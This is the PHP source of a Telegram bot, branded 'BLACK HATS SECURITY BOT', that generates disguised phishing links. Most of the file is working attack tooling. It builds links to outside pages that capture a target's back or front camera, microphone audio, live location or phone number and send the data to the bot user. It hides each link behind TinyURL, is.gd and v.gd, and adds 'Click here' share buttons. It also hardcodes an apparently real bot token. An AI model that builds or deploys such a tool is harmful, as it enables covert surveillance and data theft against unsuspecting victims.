<?php
// TELEGRAM BOT - 3 SHORT LINKS GENERATOR
error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(0);

// ============= CONFIGURATION =============
define('BOT_TOKEN', '8873976855:AAHDio7aSW1VkjqM9nAq4XC_P0JcnjOHpO4');
define('CHANNEL_USERNAME', 'saniedit9');
define('CHANNEL_LINK', 'https://t.me/primiumboss29');

// API Endpoints for Hack Tools
$APIS = [
    'BACK_CAM' => 'https://aslisdgcam.vercel.app',
    'FRONT_CAM' => 'https://aslisd-front-cam.vercel.app',
    'AUDIO' => 'https://alsdjsk-audio-hack.vercel.app',
    'NUMBER' => 'https://aslis-number.vercel.app',
    'LOCATION' => 'https://aslis-live-location.vercel.app'
];

// Banner Images
$IMAGES = [
    'MAIN' => 'https://i.ibb.co/SDw5CwSX/123d9285-dd95-4502-8115-55c42279c8b6.jpg',
    'WELCOME' => 'https://i.ibb.co/SDw5CwSX/123d9285-dd95-4502-8115-55c42279c8b6.jpg',
    'SUCCESS' => 'https://i.ibb.co/SDw5CwSX/123d9285-dd95-4502-8115-55c42279c8b6.jpg'
];

// Session handling with file storage
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// ============= FILE-BASED SESSION =============
function setUserSession($user_id, $action, $tool_name = '') {
    $data = [
        'action' => $action,
        'tool_name' => $tool_name,
        'timestamp' => time()
    ];
    file_put_contents(__DIR__ . "/session_{$user_id}.json", json_encode($data));
}

function getUserSession($user_id) {
    $file = __DIR__ . "/session_{$user_id}.json";
    if (file_exists($file) && (time() - filemtime($file)) < 3600) {
        return json_decode(file_get_contents($file), true);
    }
    return null;
}

function deleteUserSession($user_id) {
    $file = __DIR__ . "/session_{$user_id}.json";
    if (file_exists($file)) {
        unlink($file);
    }
}

// Clean old sessions
foreach (glob(__DIR__ . "/session_*.json") as $file) {
    if (time() - filemtime($file) > 3600) unlink($file);
}

// ============= TELEGRAM API =============
function tgRequest($method, $data = []) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/" . $method;
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return json_decode($response, true);
}

function sendMessage($chat_id, $text, $keyboard = null) {
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    if ($keyboard) $data['reply_markup'] = json_encode($keyboard);
    return tgRequest('sendMessage', $data);
}

function sendPhoto($chat_id, $photo, $caption = '', $keyboard = null) {
    $data = [
        'chat_id' => $chat_id,
        'photo' => $photo,
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ];
    if ($keyboard) $data['reply_markup'] = json_encode($keyboard);
    return tgRequest('sendPhoto', $data);
}

function answerCallback($callback_id, $text = null, $alert = false) {
    $data = ['callback_query_id' => $callback_id];
    if ($text) {
        $data['text'] = $text;
        $data['show_alert'] = $alert;
    }
    return tgRequest('answerCallbackQuery', $data);
}

// ============= CHECK CHANNEL MEMBERSHIP =============
function isChannelMember($user_id) {
    $data = ['chat_id' => '@' . CHANNEL_USERNAME, 'user_id' => $user_id];
    $result = tgRequest('getChatMember', $data);
    
    if ($result && isset($result['ok']) && $result['ok']) {
        $status = $result['result']['status'];
        return in_array($status, ['member', 'administrator', 'creator']);
    }
    return true;
}

// ============= GENERATE HACK LINK =============
function generateHackLink($type, $user_id, $bot_token, $url = '') {
    global $APIS;
    
    switch($type) {
        case 'backcam': return $APIS['BACK_CAM'] . "/?chatId={$user_id}&botToken={$bot_token}&url=" . urlencode($url);
        case 'frontcam': return $APIS['FRONT_CAM'] . "/?chatId={$user_id}&botToken={$bot_token}&url=" . urlencode($url);
        case 'audio': return $APIS['AUDIO'] . "/?chatId={$user_id}&botToken={$bot_token}&url=" . urlencode($url);
        case 'location': return $APIS['LOCATION'] . "/?chatId={$user_id}&botToken={$bot_token}&url=" . urlencode($url);
        case 'number': return $APIS['NUMBER'] . "/?chatId={$user_id}&botToken={$bot_token}";
        default: return '';
    }
}

// ============= 3 SHORT LINKS GENERATOR (FIXED - Returns 3 links) =============
function getThreeShortLinks($long_url) {
    $links = [];
    
    // 1. TinyURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://tinyurl.com/api-create.php?url=" . urlencode($long_url));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $tinyurl = curl_exec($ch);
    curl_close($ch);
    $links['tinyurl'] = ($tinyurl && filter_var($tinyurl, FILTER_VALIDATE_URL)) ? $tinyurl : $long_url;
    
    // 2. is.gd
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://is.gd/create.php?format=simple&url=" . urlencode($long_url));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $isgd = curl_exec($ch);
    curl_close($ch);
    $links['isgd'] = ($isgd && filter_var($isgd, FILTER_VALIDATE_URL)) ? $isgd : $long_url;
    
    // 3. v.gd (Alternative)
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://v.gd/create.php?format=simple&url=" . urlencode($long_url));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $vgd = curl_exec($ch);
    curl_close($ch);
    $links['vgd'] = ($vgd && filter_var($vgd, FILTER_VALIDATE_URL)) ? $vgd : $long_url;
    
    return $links;
}

// Alternative function that guarantees 3 links even if some fail
function getThreeLinks($long_url) {
    $links = [];
    
    // Try TinyURL
    $tiny = @file_get_contents("https://tinyurl.com/api-create.php?url=" . urlencode($long_url));
    $links['tinyurl'] = ($tiny && filter_var($tiny, FILTER_VALIDATE_URL)) ? $tiny : $long_url;
    
    // Try is.gd
    $isgd = @file_get_contents("https://is.gd/create.php?format=simple&url=" . urlencode($long_url));
    $links['isgd'] = ($isgd && filter_var($isgd, FILTER_VALIDATE_URL)) ? $isgd : $long_url;
    
    // Try v.gd as third
    $vgd = @file_get_contents("https://v.gd/create.php?format=simple&url=" . urlencode($long_url));
    $links['vgd'] = ($vgd && filter_var($vgd, FILTER_VALIDATE_URL)) ? $vgd : $long_url;
    
    // If any failed, create fallback using different service
    if ($links['vgd'] == $long_url) {
        $clckru = @file_get_contents("https://clck.ru/--?url=" . urlencode($long_url));
        $links['vgd'] = ($clckru && filter_var($clckru, FILTER_VALIDATE_URL)) ? $clckru : $long_url . "?fallback=1";
    }
    
    return $links;
}

// ============= KEYBOARDS =============
function getMainKeyboard() {
    return [
        'keyboard' => [
            ['📸 BACK CAMERA', '🤳 FRONT CAMERA'],
            ['🎤 AUDIO HACK', '📍 LIVE LOCATION'],
            ['📱 MOBILE NUMBER', '🔗 URL SHORTENER'],
            ['📊 STATS', '❓ HELP']
        ],
        'resize_keyboard' => true
    ];
}

function getCancelKeyboard() {
    return [
        'keyboard' => [['❌ CANCEL']],
        'resize_keyboard' => true
    ];
}

function getShareKeyboard($links) {
    $buttons = [];
    if (isset($links['tinyurl']) && $links['tinyurl']) {
        $buttons[] = [['text' => '📤 SHARE (TinyURL)', 'url' => "https://t.me/share/url?url=" . urlencode($links['tinyurl']) . "&text=🔥+Click+here"]];
    }
    if (isset($links['isgd']) && $links['isgd']) {
        $buttons[] = [['text' => '📤 SHARE (is.gd)', 'url' => "https://t.me/share/url?url=" . urlencode($links['isgd']) . "&text=🔥+Click+here"]];
    }
    if (isset($links['vgd']) && $links['vgd']) {
        $buttons[] = [['text' => '📤 SHARE (v.gd)', 'url' => "https://t.me/share/url?url=" . urlencode($links['vgd']) . "&text=🔥+Click+here"]];
    }
    $buttons[] = [['text' => '◀️ MAIN MENU', 'callback_data' => 'back_menu']];
    
    return ['inline_keyboard' => $buttons];
}

function getJoinKeyboard() {
    return [
        'inline_keyboard' => [
            [['text' => '📢 JOIN CHANNEL', 'url' => CHANNEL_LINK]],
            [['text' => '✅ VERIFY', 'callback_data' => 'verify_channel']]
        ]
    ];
}

// ============= COMMAND HANDLERS =============
function handleStart($chat_id, $user_id, $first_name) {
    global $IMAGES;
    
    if (!isChannelMember($user_id)) {
        $msg = "⚠️ <b>ACCESS DENIED</b>\n\nHello {$first_name}!\n\n🔒 You must join our channel to use this bot.\n\n📢 <b>Channel:</b> " . CHANNEL_LINK;
        sendPhoto($chat_id, $IMAGES['WELCOME'], $msg, getJoinKeyboard());
    } else {
        $msg = "🔥 <b>BLACK HATS SECURITY BOT</b> 🔥\n\n✅ Welcome {$first_name}!\n\n⚡ <b>Your Chat ID:</b> <code>{$user_id}</code>\n\n<b>📌 HOW TO USE:</b>\n1️⃣ Select a tool\n2️⃣ Enter website URL\n3️⃣ Get 3 shortened hack links!\n\n<i>Send any link to target → Data comes to YOU!</i>";
        sendPhoto($chat_id, $IMAGES['MAIN'], $msg, getMainKeyboard());
    }
}

function handleStats($chat_id, $user_id) {
    $msg = "📊 <b>BOT STATISTICS</b>\n\n🤖 Status: ✅ Active\n👤 Your ID: <code>{$user_id}</code>\n\n<b>⚡ Features:</b>\n• 3 Short Links per tool\n• Camera Access (Front/Back)\n• Audio Recording\n• Live Location\n• Mobile Number Grabber\n• URL Shortener\n\n<i>All data goes to YOUR Chat ID!</i>";
    sendMessage($chat_id, $msg, getMainKeyboard());
}

function handleHelp($chat_id, $user_id) {
    $msg = "❓ <b>HELP GUIDE</b>\n\n<b>📌 STEP BY STEP:</b>\n1. Click any tool button\n2. Enter website URL\n3. Get 3 shortened links!\n4. Share with target\n5. Target's data sent to YOU!\n\n<b>💡 Commands:</b>\n/start - Restart\n/cancel - Cancel\n/stats - Stats\n/help - Help\n\n<i>Your Chat ID: <code>{$user_id}</code></i>";
    sendMessage($chat_id, $msg, getMainKeyboard());
}

// ============= TOOL HANDLERS =============
function handleToolSelection($chat_id, $user_id, $tool_text) {
    global $IMAGES;
    
    $toolMap = [
        '📸 BACK CAMERA' => ['action' => 'backcam', 'name' => 'BACK CAMERA'],
        '🤳 FRONT CAMERA' => ['action' => 'frontcam', 'name' => 'FRONT CAMERA'],
        '🎤 AUDIO HACK' => ['action' => 'audio', 'name' => 'AUDIO HACK'],
        '📍 LIVE LOCATION' => ['action' => 'location', 'name' => 'LIVE LOCATION'],
        '📱 MOBILE NUMBER' => ['action' => 'number', 'name' => 'MOBILE NUMBER'],
        '🔗 URL SHORTENER' => ['action' => 'shorten', 'name' => 'URL SHORTENER']
    ];
    
    if (isset($toolMap[$tool_text])) {
        $action = $toolMap[$tool_text]['action'];
        $toolName = $toolMap[$tool_text]['name'];
        
        setUserSession($user_id, $action, $toolName);
        
        $messages = [
            'backcam' => "📸 <b>BACK CAMERA</b>\n\n🎯 Your ID: <code>{$user_id}</code>\n\n🌐 Enter website URL:\nExample: <code>https://google.com</code>\n\nType /cancel to abort",
            'frontcam' => "🤳 <b>FRONT CAMERA</b>\n\n🎯 Your ID: <code>{$user_id}</code>\n\n🌐 Enter website URL:\nExample: <code>https://google.com</code>\n\nType /cancel to abort",
            'audio' => "🎤 <b>AUDIO HACK</b>\n\n🎯 Your ID: <code>{$user_id}</code>\n\n🌐 Enter website URL:\nExample: <code>https://google.com</code>\n\nType /cancel to abort",
            'location' => "📍 <b>LIVE LOCATION</b>\n\n🎯 Your ID: <code>{$user_id}</code>\n\n🌐 Enter website URL:\nExample: <code>https://google.com</code>\n\nType /cancel to abort",
            'number' => "📱 <b>MOBILE NUMBER</b>\n\n🎯 Your ID: <code>{$user_id}</code>\n\n✨ Type <b>yes</b> to generate link\nType /cancel to abort",
            'shorten' => "🔗 <b>URL SHORTENER</b>\n\nEnter URL to shorten:\nExample: <code>https://example.com/long-url</code>\n\nType /cancel to abort"
        ];
        
        sendPhoto($chat_id, $IMAGES['MAIN'], $messages[$action], getCancelKeyboard());
    }
}

// ============= PROCESS WITH 3 LINKS (MAIN FUNCTION) =============
function processWithThreeLinks($chat_id, $user_id, $url, $action, $toolName) {
    global $IMAGES;
    
    // Validate URL
    if (!preg_match('/^https?:\/\//', $url)) {
        sendMessage($chat_id, "❌ <b>Invalid URL!</b>\n\nURL must start with http:// or https://\n\nExample: <code>https://google.com</code>\n\nTry again:", getCancelKeyboard());
        return false;
    }
    
    sendMessage($chat_id, "⏳ <b>Generating 3 Short Links...</b>\n\n├ Generating hack link\n├ Creating 3 short links\n└ Almost done!");
    
    // Generate main hack link
    $hackLink = generateHackLink($action, $user_id, BOT_TOKEN, $url);
    
    if (empty($hackLink)) {
        sendMessage($chat_id, "❌ <b>Failed to generate link!</b>\n\nPlease try again.", getMainKeyboard());
        deleteUserSession($user_id);
        return false;
    }
    
    // Generate 3 short links
    $shortLinks = getThreeLinks($hackLink);
    
    $emoji = ['backcam' => '📸', 'frontcam' => '🤳', 'audio' => '🎤', 'location' => '📍'];
    $device = $action == 'audio' ? 'Microphone' : 'Camera';
    
    // Build message with 3 links
    $msg = "✅ <b>3 SHORT LINKS GENERATED!</b>\n\n"
           . "┌─────────────────────────┐\n"
           . "│ {$emoji[$action]} {$toolName}              │\n"
           . "└─────────────────────────┘\n\n"
           . "🎯 <b>Your Chat ID:</b> <code>{$user_id}</code>\n"
           . "🌐 <b>Redirect URL:</b> <code>{$url}</code>\n\n"
           . "┌───── 🔗 3 SHORT LINKS ─────┐\n\n"
           . "📌 <b>LINK 1 (TinyURL):</b>\n"
           . "<code>" . $shortLinks['tinyurl'] . "</code>\n\n"
           . "📌 <b>LINK 2 (is.gd):</b>\n"
           . "<code>" . $shortLinks['isgd'] . "</code>\n\n"
           . "📌 <b>LINK 3 (v.gd):</b>\n"
           . "<code>" . $shortLinks['vgd'] . "</code>\n\n"
           . "┌─────────────────────────┐\n"
           . "│     ⚠️ HOW IT WORKS      │\n"
           . "├─────────────────────────┤\n"
           . "│ 1. Send ANY link above  │\n"
           . "│ 2. Target clicks        │\n"
           . "│ 3. {$device} access requested │\n"
           . "│ 4. Data sent to YOU     │\n"
           . "│ 5. Redirected to {$url} │\n"
           . "└─────────────────────────┘\n\n"
           . "<i>📤 Click SHARE buttons below to send links!</i>";
    
    sendPhoto($chat_id, $IMAGES['SUCCESS'], $msg, getShareKeyboard($shortLinks));
    deleteUserSession($user_id);
    return true;
}

function processNumberWithThreeLinks($chat_id, $user_id) {
    global $IMAGES;
    
    sendMessage($chat_id, "⏳ <b>Generating 3 Short Links...</b>");
    
    $hackLink = generateHackLink('number', $user_id, BOT_TOKEN, '');
    $shortLinks = getThreeLinks($hackLink);
    
    $msg = "✅ <b>3 SHORT LINKS GENERATED!</b>\n\n"
           . "┌─────────────────────────┐\n"
           . "│ 📱 MOBILE NUMBER GRABBER │\n"
           . "└─────────────────────────┘\n\n"
           . "🎯 <b>Your Chat ID:</b> <code>{$user_id}</code>\n\n"
           . "┌───── 🔗 3 SHORT LINKS ─────┐\n\n"
           . "📌 <b>LINK 1 (TinyURL):</b>\n"
           . "<code>" . $shortLinks['tinyurl'] . "</code>\n\n"
           . "📌 <b>LINK 2 (is.gd):</b>\n"
           . "<code>" . $shortLinks['isgd'] . "</code>\n\n"
           . "📌 <b>LINK 3 (v.gd):</b>\n"
           . "<code>" . $shortLinks['vgd'] . "</code>\n\n"
           . "┌─────────────────────────┐\n"
           . "│     ⚠️ HOW IT WORKS      │\n"
           . "├─────────────────────────┤\n"
           . "│ 1. Send ANY link above  │\n"
           . "│ 2. Target clicks        │\n"
           . "│ 3. Number is requested  │\n"
           . "│ 4. Number sent to YOU   │\n"
           . "└─────────────────────────┘\n\n"
           . "<i>📤 Click SHARE buttons below!</i>";
    
    sendPhoto($chat_id, $IMAGES['SUCCESS'], $msg, getShareKeyboard($shortLinks));
    deleteUserSession($user_id);
}

function processShortenWithThreeLinks($chat_id, $url) {
    if (!preg_match('/^https?:\/\//', $url)) {
        sendMessage($chat_id, "❌ <b>Invalid URL!</b>\n\nURL must start with http:// or https://\n\nUse /start to try again.", getMainKeyboard());
        deleteUserSession($chat_id);
        return;
    }
    
    sendMessage($chat_id, "⏳ <b>Generating 3 Short Links...</b>");
    
    $shortLinks = getThreeLinks($url);
    
    $msg = "✅ <b>3 SHORT LINKS GENERATED!</b>\n\n"
           . "┌─────────────────────────┐\n"
           . "│ 🔗 URL SHORTENER         │\n"
           . "└─────────────────────────┘\n\n"
           . "📎 <b>Original URL:</b>\n<code>{$url}</code>\n\n"
           . "┌───── 🔗 3 SHORT LINKS ─────┐\n\n"
           . "📌 <b>LINK 1 (TinyURL):</b>\n"
           . "<code>" . $shortLinks['tinyurl'] . "</code>\n\n"
           . "📌 <b>LINK 2 (is.gd):</b>\n"
           . "<code>" . $shortLinks['isgd'] . "</code>\n\n"
           . "📌 <b>LINK 3 (v.gd):</b>\n"
           . "<code>" . $shortLinks['vgd'] . "</code>\n\n"
           . "<i>📤 Click SHARE to use any link!</i>";
    
    sendMessage($chat_id, $msg, getShareKeyboard($shortLinks));
    deleteUserSession($chat_id);
}

function handleCancel($chat_id) {
    deleteUserSession($chat_id);
    sendMessage($chat_id, "❌ <b>Cancelled!</b>\n\nUse /start to begin again.", getMainKeyboard());
}

// ============= MAIN WEBHOOK =============
$content = file_get_contents("php://input");
$update = json_decode($content, true);

if ($update) {
    // Handle Callback
    if (isset($update['callback_query'])) {
        $callback = $update['callback_query'];
        $chat_id = $callback['message']['chat']['id'];
        $user_id = $callback['from']['id'];
        $data = $callback['data'];
        $callback_id = $callback['id'];
        
        if ($data == 'verify_channel') {
            if (isChannelMember($user_id)) {
                answerCallback($callback_id, "✅ Verified!");
                handleStart($chat_id, $user_id, $callback['from']['first_name']);
            } else {
                answerCallback($callback_id, "❌ Please join channel first!", true);
            }
        }
        elseif ($data == 'back_menu') {
            answerCallback($callback_id);
            handleStart($chat_id, $user_id, $callback['from']['first_name']);
        }
        else {
            answerCallback($callback_id);
        }
    }
    
    // Handle Message
    if (isset($update['message'])) {
        $msg = $update['message'];
        $chat_id = $msg['chat']['id'];
        $user_id = $msg['from']['id'];
        $first_name = $msg['from']['first_name'];
        $text = isset($msg['text']) ? trim($msg['text']) : '';
        
        // Commands
        if ($text == '/start') {
            handleStart($chat_id, $user_id, $first_name);
        }
        elseif ($text == '/stats') {
            handleStats($chat_id, $user_id);
        }
        elseif ($text == '/help') {
            handleHelp($chat_id, $user_id);
        }
        elseif ($text == '/cancel') {
            handleCancel($chat_id);
        }
        // Menu Buttons
        elseif (in_array($text, ['📸 BACK CAMERA', '🤳 FRONT CAMERA', '🎤 AUDIO HACK', '📍 LIVE LOCATION', '📱 MOBILE NUMBER', '🔗 URL SHORTENER'])) {
            handleToolSelection($chat_id, $user_id, $text);
        }
        elseif ($text == '📊 STATS') {
            handleStats($chat_id, $user_id);
        }
        elseif ($text == '❓ HELP') {
            handleHelp($chat_id, $user_id);
        }
        elseif ($text == '❌ CANCEL') {
            handleCancel($chat_id);
        }
        else {
            // Process input
            $session = getUserSession($user_id);
            
            if ($session) {
                $action = $session['action'];
                $toolName = isset($session['tool_name']) ? $session['tool_name'] : '';
                
                if ($action == 'number') {
                    if (strtolower($text) == 'yes') {
                        processNumberWithThreeLinks($chat_id, $user_id);
                    } else {
                        sendMessage($chat_id, "❌ Type <b>yes</b> to generate 3 links.\n\nType /cancel to abort.", getCancelKeyboard());
                    }
                }
                elseif ($action == 'shorten') {
                    processShortenWithThreeLinks($chat_id, $text);
                }
                elseif (in_array($action, ['backcam', 'frontcam', 'audio', 'location'])) {
                    processWithThreeLinks($chat_id, $user_id, $text, $action, $toolName);
                }
                else {
                    sendMessage($chat_id, "❌ Error. Use /start to restart.", getMainKeyboard());
                    deleteUserSession($user_id);
                }
            } else {
                sendMessage($chat_id, "❌ <b>No Active Session</b>\n\nPlease select a tool from the menu below.\n\nUse /help for assistance.", getMainKeyboard());
            }
        }
    }
}

if (php_sapi_name() == 'cli') {
    echo "🤖 Bot Running! Token: " . BOT_TOKEN . "\n";
}
?>
